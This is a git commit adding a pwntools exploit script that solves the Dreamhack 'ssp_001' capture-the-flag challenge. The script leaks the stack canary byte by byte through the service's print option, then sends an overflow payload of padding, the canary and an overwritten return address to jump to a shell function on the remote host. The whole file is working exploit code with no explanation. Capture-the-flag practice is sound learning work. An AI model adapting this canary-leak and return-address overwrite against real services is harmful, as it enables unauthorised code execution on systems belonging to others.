ff7c2f2db48d20d8c4b438407084e0234c621e06
Brian <hibrian827@gmail.com>
2024-03-25 01:16:30 +0900

    solved ssp_001

---
+++ Dreamhack/ssp_001/answer.py
@@ -0,0 +1,27 @@
+from pwn import *
+  
+
+port = 12100
+rem = remote("host3.dreamhack.games", port)
+
+shell_address = 0x80486b9
+
+canary = []
+for i in range(3, -1, -1) :
+  rem.sendafter(b">", b"P")
+  rem.sendlineafter(b'index :', str(0x80 + i).encode())
+  rem.recvuntil(b"is : ")
+  canary.append(rem.recvn(2).decode())
+canary = int(''.join(canary), 16)
+
+
+rem.sendafter(b">", b"E")
+payload = b"A" * 0x40
+payload += p32(canary)
+payload += b"B" * 8
+payload += p32(shell_address)
+ 
+rem.sendlineafter(b"Size :", str(len(payload) + 2).encode())
+rem.sendlineafter(b"Name :", payload)
+
+rem.interactive()
